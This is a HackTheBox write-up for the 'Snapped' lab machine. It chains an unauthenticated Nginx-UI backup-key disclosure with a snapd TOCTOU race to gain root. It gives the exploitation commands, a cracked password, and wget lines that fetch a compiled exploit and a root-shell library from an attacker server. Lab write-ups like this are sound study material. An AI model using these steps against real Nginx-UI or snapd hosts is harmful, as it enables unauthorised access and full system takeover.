# HackTheBox — Snapped

**Platform:** HackTheBox | **OS:** Linux | **Difficulty:** Hard | **Status:** Retired  
**Release Date:** 23 Mar 2026  
**CVEs Covered:** CVE-2026-27944 · CVE-2026-3888  
**Tools Used:** Nmap, ffuf, feroxbuster, Python (pycryptodome), SQLite, Hashcat, snap-confine exploit

---

## Summary

Snapped is a Hard-rated Linux machine that chains two real-world CVEs to achieve full system compromise from an unauthenticated starting position. The foothold exploits **CVE-2026-27944**, an unauthenticated backup disclosure vulnerability in Nginx-UI where the application hands over its own AES decryption key in the same response that delivers the encrypted backup. Decrypting the archive exposes a SQLite database containing bcrypt password hashes, one of which cracks to yield SSH access. Privilege escalation exploits **CVE-2026-3888**, a high-severity TOCTOU race condition in snapd where an interaction between `snap-confine` (a SUID-root binary) and `systemd-tmpfiles` allows an unprivileged user to replace the dynamic linker with a malicious payload and gain a root shell.

---

## Attack Chain Overview

```
Nmap → Virtual host discovery (ffuf) → admin.snapped.htb (Nginx-UI v2.3.2)
→ CVE-2026-27944: GET /api/backup (no auth) → AES key in X-Backup-Security header
→ Decrypt backup → SQLite database → bcrypt hash (jonathan)
→ Hashcat crack → SSH as jonathan → user.txt
→ snapd 2.63.1 identified → CVE-2026-3888 TOCTOU race
→ AF_UNIX socket backpressure → dynamic linker hijack → root shell → root.txt
```

---

## 1. Reconnaissance

### Port Scan

```bash
sudo nmap -p- --min-rate 10000 10.129.34.143
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Full version scan against confirmed ports:

```bash
sudo nmap -p 22,80 -sCV 10.129.34.143
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4b:c1:eb:48:87:4a:08:54:89:70:93:b7:c7:a9:ea:79 (ECDSA)
|_  256 46:da:a5:65:91:c9:08:99:b2:96:1d:46:0b:fc:df:63 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://snapped.htb/
```

**Analysis:**

- **Port 22** — OpenSSH 9.6p1 on Ubuntu 24.04. Not directly exploitable; noted as a potential SSH target once credentials are obtained.
- **Port 80** — nginx 1.24.0 redirecting to `snapped.htb`. Virtual hosting in use — subdomain enumeration required.

Add the hostname to `/etc/hosts`:

```bash
echo "10.129.34.143 snapped.htb" | sudo tee -a /etc/hosts
```

<img width="770" height="359" alt="image" src="https://github.com/user-attachments/assets/ff18aedf-4f25-48d6-ad16-93758a63a549" />


---

## 2. Web Enumeration

### Main Site — snapped.htb

Navigating to `http://snapped.htb` serves a static marketing page for an infrastructure orchestration platform. All links are anchor tags pointing to sections of the same page. No login panel, no forms, no dynamic content — dead end for direct exploitation.

```bash
feroxbuster -u http://snapped.htb -x html
```

```text
200  GET  http://snapped.htb/
200  GET  http://snapped.htb/index.html
200  GET  http://snapped.htb/style.css
```

Nothing beyond the static site. Attention shifts to virtual host discovery.

<img width="1166" height="938" alt="image" src="https://github.com/user-attachments/assets/7db941ba-d5b3-4f2b-a725-de149be0fcfd" />


### Virtual Host Discovery

```bash
ffuf -u http://10.129.34.143 \
  -H 'Host: FUZZ.snapped.htb' \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt \
  -ac
```

```text
admin     [Status: 200, Size: 1407, Words: 164, Lines: 50]
```

Update `/etc/hosts`:

```bash
echo "10.129.34.143 snapped.htb admin.snapped.htb" | sudo tee -a /etc/hosts
```

<img width="771" height="486" alt="image" src="https://github.com/user-attachments/assets/5a468ef7-5473-490e-868d-e67cd9adaa8e" />


### admin.snapped.htb — Nginx-UI

Navigating to `http://admin.snapped.htb` reveals an **Nginx-UI** admin panel — a third-party web interface for managing Nginx configurations, written in Go (backend) and Vue.js (frontend).

Version fingerprinting via the loaded JavaScript assets:

```bash
curl http://admin.snapped.htb/ -s | grep -P '.js\b'
# Returns: ./assets/index-DoHxQupa.js

curl http://admin.snapped.htb/assets/version-BWPlJ0ga.js
# Returns: const t="2.3.2"
```

**Nginx-UI version: 2.3.2** — this version is vulnerable to CVE-2026-27944.

<img width="1919" height="920" alt="image" src="https://github.com/user-attachments/assets/8bac999d-8de1-49b9-9414-7997240fdc3c" />

API endpoint enumeration:

```bash
feroxbuster -u http://admin.snapped.htb/api
```

The `/api/backup` endpoint responds without requiring authentication — confirming the CVE is present.

---

## 3. Exploitation — CVE-2026-27944 (Nginx-UI Unauthenticated Backup Disclosure)

### Vulnerability Explanation

Nginx-UI exposes a `/api/backup` endpoint that generates and serves a full AES-encrypted backup of the application — including Nginx configs, SSL keys, session data, and its internal SQLite database. The critical design flaw is that **the AES decryption key is returned in the `X-Backup-Security` response header of the same unauthenticated request** that delivers the encrypted backup. An attacker needs no credentials, no brute force, and no prior access to fully decrypt the backup in a single HTTP request.

This is a complete, unauthenticated path to the application's internal database.

### Setting Up the Exploit Script

Create a Python virtual environment and install the required AES library:

```bash
mkdir -p exploit && cd exploit
python3 -m venv venv
source venv/bin/activate
pip install pycryptodome
```

The exploit script (`exploit_enhanced.py`) performs three operations:

1. Sends `GET /api/backup` with no authentication headers.
2. Extracts the AES key and IV from the `X-Backup-Security` response header.
3. Decrypts the backup archive and extracts its contents to `backup_extracted/`.

<img width="577" height="674" alt="image" src="https://github.com/user-attachments/assets/6894bb80-1e7f-4744-a41e-1203fdbb5191" />


### Running the Exploit

```bash
python3 exploit_enhanced.py --target http://admin.snapped.htb --out backup.bin --decrypt
```

<img width="813" height="679" alt="image" src="https://github.com/user-attachments/assets/66389c77-4dc3-4458-8983-b136ca808911" />


---

## 4. Credential Recovery

### Inspecting the Backup

```bash
ls backup_extracted/
```

The extracted backup contains Nginx configuration files and a **SQLite database** — Nginx-UI's internal user store.

<img width="1021" height="61" alt="image" src="https://github.com/user-attachments/assets/4e66f75a-6680-4ef6-b0dc-a4d2012da117" />


### Dumping the Database

```bash
sqlite3 backup_extracted/database.db
.tables
SELECT * FROM users;
```

<img width="1453" height="302" alt="Screenshot 2026-05-19 070939" src="https://github.com/user-attachments/assets/2e77d598-cdc2-4410-b411-fd207bf54edd" />


The database contains a user **jonathan** with a bcrypt-hashed password:

```text
$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
```

### Cracking the Hash

Save to `hash.txt` and run Hashcat. Bcrypt (mode 3200) is computationally expensive by design — GPU cracking is significantly faster than CPU:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```
<img width="1200" height="517" alt="image" src="https://github.com/user-attachments/assets/09a28c69-478a-4e6a-a8f9-5d1a9fa75b07" />


The hash cracks to: **linkinpark**

<img width="660" height="381" alt="image" src="https://github.com/user-attachments/assets/804199c5-6a03-4104-b9d3-66ffa00f9f48" />


---

## 5. Initial Access — SSH as jonathan

```bash
ssh jonathan@snapped.htb
# Password: linkinpark
```

```bash
cat /home/jonathan/user.txt
```

<img width="956" height="455" alt="image" src="https://github.com/user-attachments/assets/d4f79b85-be44-436d-b7dc-dac033d39947" />


**User flag captured.**

---

## 6. Post-Exploitation Enumeration

### System Information

```bash
uname -a
cat /etc/os-release
```

```text
Ubuntu 24.04 LTS (Noble Numbat)
```

### Identifying snapd

```bash
snap version
```

```text
snap    2.63.1
snapd   2.63.1
series  16
ubuntu  24.04
kernel  6.8.0-52-generic
```

**snapd 2.63.1** on Ubuntu 24.04 — directly within the vulnerable range for CVE-2026-3888. Confirming snap applications are installed:

```bash
snap list
```

<img width="720" height="176" alt="image" src="https://github.com/user-attachments/assets/be30f2ce-9f21-4c74-a7dd-c97b4c4587bd" />


The presence of a SUID-root `snap-confine` binary is the core precondition for the privilege escalation:

```bash
find / -name snap-confine -perm -4000 2>/dev/null
ls -la /usr/lib/snapd/snap-confine
```

<img width="576" height="99" alt="image" src="https://github.com/user-attachments/assets/59416317-7b3e-4aa1-a80b-45a572ae15ab" />


---

## 7. Privilege Escalation — CVE-2026-3888 (snapd TOCTOU Race Condition)
 
### Vulnerability Explanation
 
CVE-2026-3888 is a **TOCTOU (Time-of-Check to Time-of-Use)** race condition in snapd, discovered by the Qualys Threat Research Unit. It exploits a timing conflict between two trusted system components:
 
**snap-confine** is a SUID-root binary that builds execution sandboxes for snap applications. When a snap launches, `snap-confine` initializes a working directory under `/tmp/.snap/` and uses it during the bind-mount sequence that constructs the sandbox.
 
**systemd-tmpfiles** periodically cleans up stale temporary directories — including `/tmp/.snap` left behind by snap after a crash or incomplete launch.
 
**The race:** When `systemd-tmpfiles` deletes `/tmp/.snap`, there is a brief window before `snap-confine` recreates it. If the attacker manually deletes `/tmp/.snap` at the right moment and wins that window, `snap-confine` — running as root — proceeds to bind-mount the attacker-controlled directory, enabling full privilege escalation.
 
### Step 1 — Compile the Exploit on Your Attacker Machine
 
The exploit consists of two compiled C files. Both are compiled **on the attacker machine** to avoid needing gcc on the target.
 
Obtain the PoC from the public advisory repo, then compile:
 
```bash
# On attacker machine
gcc -O2 -static -o exploit exploit_suid.c
gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c
```
 
<img width="683" height="101" alt="image" src="https://github.com/user-attachments/assets/c2581344-0324-439e-adc0-7adc4050d85a" />

 
### Step 2 — Transfer Both Files to the Target
 
Start an HTTP server on the attacker machine from the directory containing the compiled files:
 
```bash
# Attacker machine
python3 -m http.server 8080
```
 
On the target machine as jonathan:
 
```bash
# Target machine
wget http://10.10.14.8:8080/exploit -O ~/exploit
wget http://10.10.14.8:8080/librootshell.so -O ~/librootshell.so
chmod +x ~/exploit
```
 
<img width="1882" height="369" alt="image" src="https://github.com/user-attachments/assets/f2c814bd-8eb4-48cc-b431-fbcfd8e8bfdf" />

 
### Step 3 — Open Two SSH Sessions
 
This exploit requires two simultaneous terminal sessions on the target. Open a second terminal on your attacker machine and SSH in again as jonathan:
 
```bash
ssh jonathan@snapped.htb
```
 
**Session 1** runs the exploit and waits.
**Session 2** manually triggers the cleanup at the right moment.
 
### Step 4 — Run the Exploit (Session 1)
 
```bash
~/exploit ~/librootshell.so
```
 
The exploit will start polling and print output like:
 
```text
[*] CVE-2026-3888
[*] Polling for /tmp/.snap cleanup window...
```
 
Leave this running and switch to Session 2.
 
<img width="526" height="194" alt="image" src="https://github.com/user-attachments/assets/d9304792-72f8-45db-a5ce-9b785decf710" />

 
### Step 5 — Trigger the Cleanup (Session 2)
 
Once the exploit is polling in Session 1, manually delete `/tmp/.snap` in Session 2 to simulate the `systemd-tmpfiles` cleanup and open the race window:
 
```bash
rm -rf /tmp/.snap
```
 
Switch back to Session 1 and watch for the exploit to win the race.
 
<img width="316" height="38" alt="image" src="https://github.com/user-attachments/assets/971f29df-350b-44ea-81c4-f7f6c9410427" />

 
### Step 6 — Root Shell
 
When the race is won, Session 1 will drop into a root shell via the Firefox snap's bash binary:
 
```bash
/var/snap/firefox/common/bash -p
whoami
# root
```
 
```bash
cat /root/root.txt
```
 
<img width="274" height="100" alt="image" src="https://github.com/user-attachments/assets/0f707943-4fd0-44eb-ac7c-475da8bdcdb9" />

 
**Root flag captured.**
 
---
 
## Lessons Learned
 
**Self-defeating encryption is worse than no encryption.** CVE-2026-27944 is a textbook example of security theater — the application encrypted its backup but included the decryption key in the same unauthenticated response. In a real engagement, any endpoint returning sensitive material alongside its own decryption mechanism is an automatic critical finding regardless of the encryption algorithm used.
 
**TOCTOU vulnerabilities in SUID binaries have an outsized blast radius.** CVE-2026-3888 shows why race conditions involving root-owned binaries are treated as high-severity even when the window is narrow. The interaction between `systemd-tmpfiles` and `snap-confine` is a default behavior on every Ubuntu system running snapd — no misconfiguration required.
 
**Subdomain enumeration is not optional.** The entire attack path began with discovering `admin.snapped.htb`. The main domain was a dead end. Without virtual host fuzzing, the Nginx-UI panel and the entire CVE chain would have been invisible.
 
**Bcrypt does not compensate for weak passwords.** The hash was bcrypt with cost factor 10 — correctly configured. The password (`linkinpark`) was in rockyou.txt. Algorithm strength is irrelevant if the underlying secret is weak. Always attempt hash cracking regardless of algorithm.
 
**Check snapd version on every Ubuntu target.** CVE-2026-3888 affects Ubuntu 16.04 through 24.04 LTS with snapd below 2.73. It requires no special permissions — any local user with a snap installed is a viable attack path.
 
---
 
## References
 
- [CVE-2026-27944 — Nginx-UI Backup Disclosure](https://nvd.nist.gov/vuln/detail/CVE-2026-27944)
- [CVE-2026-3888 — Qualys TRU Advisory](https://blog.qualys.com/vulnerabilities-threat-research/2026/03/17/cve-2026-3888-important-snap-flaw-enables-local-privilege-escalation-to-root)
- [HTB Official CVE Breakdown](https://www.hackthebox.com/blog/CVE-2026-27944-CVE-2026-3888)
- [karimelsheikh1 — HTB Snapped Writeup](https://github.com/karimelsheikh1/HTB-Snapped-Writeup)
- [Nginx-UI GitHub](https://github.com/0xJacky/nginx-ui)
- [HackTheBox — Snapped](https://www.hackthebox.com/machines/snapped)
 
